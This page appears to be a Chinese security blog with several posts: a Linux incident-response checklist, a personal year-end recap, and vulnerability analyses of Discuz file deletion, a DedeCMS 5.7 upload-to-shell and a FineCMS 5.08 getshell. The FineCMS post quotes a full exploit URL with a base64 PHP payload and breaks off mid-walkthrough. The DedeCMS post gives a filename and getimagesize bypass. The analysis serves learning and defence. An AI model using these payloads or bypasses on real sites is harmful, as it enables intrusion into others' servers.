      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/30/Linux应急响应排查/" itemprop="url">Linux应急响应排查</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-30T15:48:51+08:00">
                2020-01-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>对于一般的Linux机器被入侵，第一要务是止损，止损的步骤如下。</p>
<ul>
<li>如果业务允许，最好先关停除ssh外的对外开放服务，因为往往拿到机器权限后没有办法第一时间锁定入侵源</li>
<li>对入侵者的权限维持(反弹shell/后门…)进行查杀等操作(关键操作及时取证)</li>
</ul>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
<li>防止命令被替换，最好使用busybox进行排查，<a href="https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-x86_64" target="_blank" rel="external">下载地址</a><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">chmod</span> +x <span class="keyword">busybox</span></div><div class="line">./<span class="keyword">busybox </span>COMMAND</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>1) 通过pstree查看正常父进程下的异常子进程<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">pstree -aup</div><div class="line">./busybox pstree -p</div><div class="line">$</div><div class="line">systemd─├─php-fpm───<span class="number">5</span>*<span class="string">[php-fpm]</span></div><div class="line">        ├─php-fpm───<span class="number">50</span>*<span class="string">[php-fpm]</span></div></pre></td></tr></table></figure></p>
<p>如果使用ps去查询进程，没有办法清晰的查看父子进程的关系，容易有遗漏，以下是在该机器上反弹shell后pstree得到的结果。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$</div><div class="line">├─php-fpm,<span class="number">17883</span></div><div class="line">  ├─php-fpm,<span class="number">17911</span>,www</div><div class="line">  │   │   └─sh,<span class="number">11498</span> -c /bin/sh -c <span class="string">"cd "</span>/data/wwwroot/<span class="section">default</span>/dvwa<span class="string">";ping -c20 www.baidu.com;echo [S];pwd;echo [E]"</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></div><div class="line">  │   │       └─sh,<span class="number">11499</span> -c cd /data/wwwroot/<span class="section">default</span>/dvwa;ping -c20 www.baidu.com;echo [S];pwd;echo [E]</div><div class="line">  │   │           └─ping,<span class="number">11500</span> -c20 www.baidu.com</div></pre></td></tr></table></figure></p>
<p>很清楚的看到php-fpm底下起了sh进程</p>
<p>2) 查看进程启动时间</p>
<p>使用ps命令列出进程时，可能由于进程较多，优先排查入侵时间附近的进程<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps -aux</div><div class="line">$</div><div class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</div><div class="line">root         <span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span> <span class="number">191000</span>  <span class="number">3932</span> ?        Ss   <span class="number">8</span>月<span class="number">06</span>  <span class="number">16</span>:<span class="number">41</span> /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">systemd</span>/<span class="title">systemd</span> --<span class="title">switched</span>-<span class="title">root</span> --<span class="title">system</span> --<span class="title">deserialize</span> 21</span></div><div class="line">root         <span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>      <span class="number">0</span>     <span class="number">0</span> ?        S    <span class="number">8</span>月<span class="number">06</span>   <span class="number">0</span>:<span class="number">00</span> [kthreadd]</div></pre></td></tr></table></figure></p>
<p>3) 使用unhide查看隐藏进程</p>
<p>为了尽可能的维持权限，入侵者可能会将相关后门进程隐藏，隐藏的方式有以下几种</p>
<ul>
<li>替换<code>top</code> <code>ps</code> 等系统命令</li>
<li>劫持文件<code>ld.so.preload</code></li>
<li>劫持libc库</li>
<li>使用mount将其他目录挂载到<code>/proc/pid</code>下</li>
<li>修改内核(rootkit)</li>
</ul>
<p>其中前三种可以使用unhide工具进行查杀，原因为前三种方式无法修改/proc下的文件信息，因此使用unhide调用系统函数读取proc再将读取的信息与ps做对比，即可发现隐藏进程。</p>
<p>针对挂载的隐藏方式，使用命令<code>mount -l</code>查看是否有到<code>/proc</code>下的挂载，有的话使用<code>umount /proc/pid</code>取消挂载，查看对应进程是否恶意</p>
<p>针对修改内核的隐藏方式，使用命令<code>lsmod</code>查看是否有加载异常模块, 但rootkit可删除<code>struct module</code>中的lsmod相关信息，从而躲避检测，具体可参考<a href="http://pwn4.fun/2017/03/16/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%BA%8C%EF%BC%89%E9%9A%90%E8%97%8FLKM/" target="_blank" rel="external">Rootkit技术（二）隐藏LKM</a></p>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>1) 使用netstat命令检查已建立连接<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">netstat -antlp | grep EST</div><div class="line">$</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.2</span>:<span class="number">22</span>       <span class="number">172.28</span><span class="meta">.2</span><span class="meta">.1</span>:<span class="number">32971</span>    ESTABLISHED <span class="number">671</span>/sshd: admin</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.2</span>:<span class="number">19288</span>    <span class="number">10.207</span><span class="meta">.224</span><span class="meta">.3</span>:<span class="number">5555</span>     ESTABLISHED <span class="number">1896</span>/bash</div><div class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">42008</span>         <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">1234</span>          TIME_WAIT   -</div></pre></td></tr></table></figure></p>
<p>上述命令可监控如下场景</p>
<ul>
<li>反弹shell(进程名为bash/sh/python/php/java/perl等等)</li>
<li>非正常ssh登录(企业中往往使用堡垒机登录机器，而黑客则会使用获得权限的机器进行横向渗透，因此非堡垒机的ssh连接均为异常连接)</li>
<li>即使服务监听地址是127.0.0.1，也有可能通过端口反弹等形式反弹到外网，因此需要结合进程做判断</li>
</ul>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>1) 查看SSH登录日志<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cat</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/secure</div></pre></td></tr></table></figure></p>
<p>登录失败的情况也需要关注，登录失败的ip可用于关联分析其他恶意行为，以及登录失败的日志也可能被用作后门，具体可参考 <a href="https://www.freebuf.com/articles/system/185942.html" target="_blank" rel="external">记一次安全应急响应中遇到的利用SSH日志触发的后门分析</a></p>
<p>2) 查看known_hosts<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat ~<span class="regexp">/.ssh/</span>known_hosts</div></pre></td></tr></table></figure></p>
<p>known_hosts文件会记录通过ssh,scp访问的计算机的ip以及公钥</p>
<p>3) pam相关<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">cat</span> /etc/pam.d/sshd</div><div class="line"><span class="keyword">ll</span> /lib64/security/pam_unix.<span class="keyword">so</span></div></pre></td></tr></table></figure></p>
<p>查看sshd的pam配置文件以及认证文件是否存在异常，具体可参考文章<a href="https://wooyun.js.org/drops/Linux%20PAM&amp;&amp;PAM%E5%90%8E%E9%97%A8.html" target="_blank" rel="external">Linux PAM&amp;&amp;PAM后门</a></p>
<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li>应用目录<ul>
<li>Nginx: 查找nginx.conf配置文件，定位应用目录。检索目录下是否有异常文件(webshell)以及检索相应log日志是否有攻击或入侵痕迹</li>
<li>Apache: 查找<code>apache2.conf</code>或<code>apache.conf</code>等配置文件，定位应用目录。检索目录下是否有异常文件(webshell)以及检索相应log日志是否有攻击或入侵痕迹</li>
<li>webshell检测工具可使用长亭<a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="external">牧云</a></li>
</ul>
</li>
<li>/tmp</li>
<li>/var/tmp</li>
<li>/dev/shm</li>
</ul>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><ul>
<li>用户目录下的history(通过/etc/passwd定位用户目录，查询每个目录下的.bash_history文件)</li>
</ul>
<h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><ul>
<li>inittab<ul>
<li>inittab的启动脚本主要在<code>/etc/rc.d</code>下，配置文件则在<code>/etc/inittab</code>或<code>/etc/init/*.conf</code></li>
</ul>
</li>
<li>systemd<ul>
<li>systemd的启动脚本在<code>/lib/systemd/system</code>下，具体格式可参考<a href="https://www.jianshu.com/p/79059b06a121" target="_blank" rel="external">systemctl使用方法</a></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/10/14/2017年总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/14/2017年总结/" itemprop="url">2017年总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-14T21:27:20+08:00">
                2017-10-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/杂谈/" itemprop="url" rel="index">
                    <span itemprop="name">杂谈</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>秋招终于是告一段落了，想想自己这半年来的历程，不经有些感慨。</p>
<p>从今年三月份的时候，我开始接触安全，相比很多大一开始接触的同学，我真的可以说是非常非常晚了。所以也一再犹豫，到底该不该转做安全（因为我一开始就打算找工作了，之前学的是前端）。后来还是一横心开始学了。</p>
<p>现在想想，自己会学安全的理由真的很简单，就是觉得ctf特别有趣，进而觉得安全特别有趣。</p>
<p>在四五月份的时候，考虑到就业问题，如果没有实习经历会特别吃亏，所以打算找一份实习好好干干，可以说是特别幸运了，在四月中旬就有一家乙方要了我，岗位是渗透测试实习生。</p>
<p>当然，去到之后才发现，做的其实很杂，售前也做，售后也做，包括有时候还要自己把服务器带到客户那边部署安装。虽然总的来说，这份工作不是我想象中的工作，但依然收获了很多，所以在这里特别感谢当时的同事以及上级，你们真的很可爱哈哈哈。</p>
<p>七月份我就离职了，因为考虑到准备秋招的缘故。所以自己心里还是很愧疚的，但是权衡了一下，还是找工作重要，所以就硬着头皮跟上司讲了。这里再一次感谢boss，很爽快的就答应了。</p>
<p>直到九月份，都在学习学习学习。基础不牢，怕地动山摇，所以疯狂吸收养分。从九月开始正式秋招。</p>
<p>中间经历了许多的笔试和面试，终于在今天尘埃落定了，也算找到一个好的归宿。</p>
<p>通过这次的秋招，我也对未来自己的方向有了更多的认识，需要学习的还很多，以后可有的忙了。</p>
<p>面经我就不bilibili了，有时间再总结哈哈哈。对了对了，顺带一提，我打算做一个信息安全面试题的汇总，就放在我的<a href="https://github.com/Dollarsss/sec-interview" target="_blank" rel="external">gayhubhub</a>上面，各位有空多关注呀。</p>
<p>就是那么多了，又要准备迎接新一段的挑战，希望自己继续跨越下一个山峰！</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/10/10/关于discuz任意文件删除的一点思路/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/10/10/关于discuz任意文件删除的一点思路/" itemprop="url">关于discuz任意文件删除的一点思路</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-10T16:31:13+08:00">
                2017-10-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/" itemprop="url" rel="index">
                    <span itemprop="name">php</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>具体的复现文章可参考：<br><a href="https://paper.seebug.org/411/" target="_blank" rel="external">https://paper.seebug.org/411/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($_FILES) &#123;</div><div class="line">		$upload = <span class="keyword">new</span> discuz_upload();</div><div class="line">		<span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $file) &#123;</div><div class="line">			<span class="keyword">if</span>(!<span class="keyword">isset</span>($_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key])) &#123;</div><div class="line">				<span class="keyword">continue</span>;</div><div class="line">			&#125;</div><div class="line">			$field = $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key];</div><div class="line">			<span class="keyword">if</span>((!<span class="keyword">empty</span>($file) &amp;&amp; $file[<span class="string">'error'</span>] == <span class="number">0</span>) || (!<span class="keyword">empty</span>($space[$key]) &amp;&amp; <span class="keyword">empty</span>($_GET[<span class="string">'deletefile'</span>][$key]))) &#123;</div><div class="line">				$value = <span class="string">'1'</span>;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$value = <span class="string">''</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span>(!profile_check($key, $value, $space)) &#123;</div><div class="line">				profile_showerror($key);</div><div class="line">			&#125; <span class="keyword">elseif</span>($field[<span class="string">'size'</span>] &amp;&amp; $field[<span class="string">'size'</span>]*<span class="number">1024</span> &lt; $file[<span class="string">'size'</span>]) &#123;</div><div class="line">				profile_showerror($key, lang(<span class="string">'spacecp'</span>, <span class="string">'filesize_lessthan'</span>).$field[<span class="string">'size'</span>].<span class="string">'KB'</span>);</div><div class="line">			&#125;</div><div class="line">			$upload-&gt;init($file, <span class="string">'profile'</span>);</div><div class="line">			$attach = $upload-&gt;attach;</div><div class="line"></div><div class="line">			<span class="keyword">if</span>(!$upload-&gt;error()) &#123;</div><div class="line">				$upload-&gt;save();</div><div class="line"></div><div class="line">				<span class="keyword">if</span>(!$upload-&gt;get_image_info($attach[<span class="string">'target'</span>])) &#123;</div><div class="line">					@unlink($attach[<span class="string">'target'</span>]);</div><div class="line">					<span class="keyword">continue</span>;</div><div class="line">				&#125;</div><div class="line">				$setarr[$key] = <span class="string">''</span>;</div><div class="line">				$attach[<span class="string">'attachment'</span>] = dhtmlspecialchars(trim($attach[<span class="string">'attachment'</span>]));</div><div class="line">				<span class="keyword">if</span>($vid &amp;&amp; $verifyconfig[<span class="string">'available'</span>] &amp;&amp; <span class="keyword">isset</span>($verifyconfig[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">					<span class="keyword">if</span>(<span class="keyword">isset</span>($verifyinfo[<span class="string">'field'</span>][$key])) &#123;</div><div class="line">						@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">						$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">					&#125;</div><div class="line">					<span class="keyword">continue</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>($setarr[$key]) &amp;&amp; $_G[<span class="string">'cache'</span>][<span class="string">'profilesetting'</span>][$key][<span class="string">'needverify'</span>]) &#123;</div><div class="line">					@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$verifyinfo[<span class="string">'field'</span>][$key]);</div><div class="line">					$verifyarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">					<span class="keyword">continue</span>;</div><div class="line">				&#125;</div><div class="line">				var_dump(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">				@unlink(getglobal(<span class="string">'setting/attachdir'</span>).<span class="string">'./profile/'</span>.$space[$key]);</div><div class="line">				$setarr[$key] = $attach[<span class="string">'attachment'</span>];</div><div class="line">			&#125;</div><div class="line"></div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>这里我说下我的一点思考，漏洞的定位点在修改个人配置里面的文件操作部分。<code>spacecp_profile.php</code>的<code>if($_FILES)</code>分支。在这个分支里，会先上传图片（过程有检测），然后再判断验证信息，如果缺少对应的验证信息，则把之前上传的图片删除。这里的删除调用了<code>unlink</code>函数，这是一个根据传入路径删除文件的函数。</p>
<p>而文件的信息，经过<code>discuz_upload</code>类的初始化，会存储在其<code>attach</code>数组当中。对应的文件路径，则为<code>attach[&#39;target&#39;]</code>。因此，合理的做法是，无论是什么样的条件导致不能通过验证，都应该去调用：<br><code>unlink($attach[&#39;target&#39;])</code></p>
<p>然而我们看到，在上述代码的最后一段，使用的是拼接变量<code>space[$key]</code>，<code>space</code>为用户个人配置的数组，<code>key</code>为上传文件中的<code>name</code>值，因此，只要修改个人配置信息为恶意变量，即可完成注入。</p>
<p>官方的修复方案是，直接把所有的<code>unlink</code>调用给删了..，可能他们自己也读不懂以前留下来的代码吧。</p>
<p>至于漏洞利用，大家可以发挥创造力，比如有人提出通过该漏洞删除安装锁，然后重装进后台再想办法getshell。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/09/26/dedecms5-7后台getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/26/dedecms5-7后台getshell/" itemprop="url">dedecms5.7后台getshell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-26T22:39:18+08:00">
                2017-09-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/" itemprop="url" rel="index">
                    <span itemprop="name">php</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>dedecms5.7爆出了一个新的漏洞，可以后台getshell。<br>(<a href="https://mp.weixin.qq.com/s/IZn_xnO2tyUWmx9dronYUQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/IZn_xnO2tyUWmx9dronYUQ</a>)<br>还挺有意思的，大家可以跟一下。</p>
<p>漏洞的点主要是在开发者在调用了通用的文件处理函数之后，又对文件进行了进一步的处理。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!empty(<span class="variable">$&#123;$_key.'_name'&#125;</span>) &amp;&amp; (preg_match(<span class="string">"#\.("</span>.<span class="variable">$cfg_not_allowall</span>.<span class="string">")$#i"</span>,<span class="variable">$&#123;$_key.'_name'&#125;</span>) || !preg_match(<span class="string">"#\.#"</span>, <span class="variable">$&#123;$_key.'_name'&#125;</span>)) )&#123;</div><div class="line">        <span class="keyword">if</span>(!defined(<span class="string">'DEDEADMIN'</span>))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">exit</span>(<span class="string">'Not Admin Upload filetype not allow !'</span>);</div><div class="line">        &#125;</div><div class="line">&#125; <span class="regexp">//u</span>ploadsafe.inc.php</div></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$imgfile_name</span> = trim(preg_replace(<span class="string">"#[ \r\n\t\*\%\\\/\?&gt;&lt;\|\":]&#123;1,&#125;#"</span>, <span class="string">''</span>, <span class="variable">$imgfile_name</span>));</div><div class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"#\.("</span>.<span class="variable">$cfg_imgtype</span>.<span class="string">")#i"</span>, <span class="variable">$imgfile_name</span>))</div><div class="line">&#123;</div><div class="line">    ShowMsg(<span class="string">"你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！"</span>, <span class="string">"-1"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="variable">$nowtme</span> = time(); <span class="regexp">//</span>select_images_post.php</div></pre></td></tr></table></figure>
<p>其实公共函数处理没多大问题，但是因为后面将一些特殊字符替换成空格，所以这个时候思路就有了。在上传时将文件名改成夹杂特殊字符的文件名。如<code>1.jpg?p*h%p</code>。</p>
<p>但是稍微坑爹的地方来了，在<code>select_images_post.php</code>的最后调用了<code>getimagesize()</code>，如果为false则直接<code>die()</code>。但是其实getimagesize是可以绕过的，原因在于它判断imagetype时只是判断前三个字节，因此只要前三个字节符合jpg等图片格式即可。有文章提到这部分的底层细节，值得看看。</p>
<p><a href="http://0x1.im/blog/php/php-function-getimagesize.html" target="_blank" rel="external">http://0x1.im/blog/php/php-function-getimagesize.html</a></p>
<p>因此，最后成功实现了后台传shell。</p>
<p>所以说，开发的在涉及一些敏感操作前，最好看看底层实现。我相信类似的漏洞在其他CMS也是存在的，可以审一波。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/08/12/finecms-5-08-前台getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/12/finecms-5-08-前台getshell/" itemprop="url">finecms_5.08_前台getshell</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-12T10:38:45+08:00">
                2017-08-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/php/" itemprop="url" rel="index">
                    <span itemprop="name">php</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>这是六月份的一个漏洞，当时漏洞作者直接在自己的blog公布细节了，但是对于初学者来说可能理解起来还是有点吃力，所以我对这个漏洞进行了跟踪复现，希望各位能有所收获。</p>
<p>首先我们直接看作者的payload</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://your_address/<span class="built_in">index</span>.php?c=api&amp;m=data2&amp;auth=0ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;<span class="keyword">file</span>=<span class="keyword">data</span>:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</div></pre></td></tr></table></figure>
<p>我们直接输入payload从Index.php开始跟踪。<br><img src="http://i4.piimg.com/599904/f2be94e56086b4e6.png" alt=""></p>
<p>跟进到init.php。<br><img src="http://i4.piimg.com/599904/afcf585b38ddc6ce.png" alt=""></p>
<p>可以看到通过判断uri是否存在来判断是否进行路由跳转，如果是index.php或？开头则不跳转。<br>（trim和strpos都是常用的php函数，三元式也非常常见，不懂的朋友们可以自行翻看php手册，如果是mac用户可以安装一个dash，配上小帽子查阅会比较方便。）我们继续往下看。</p>
<p><img src="http://i4.piimg.com/599904/029b14412eb25b04.png" alt=""><br>这里直接跳到了流程处理文件。CI(CodeIgniter)是一个开源的php的web开发框架。所以你们会看到很明显的finecms自己的代码注释是中文，而CI部分的代码注释是英文。我们跟进去看。<br><img src="http://i4.piimg.com/599904/961ea75d43ed2a85.png" alt=""><br>CI是一个api类的实例，api类在<code>/finecms/dayrui/controllers/Api.php</code>中。<code>call_user_func_array</code>是php内置的一个调用用户函数的函数。传入回调函数和参数，其中参数为数组形式进行调用。如果要调用类的方法，则需要传入数组。如：</p>
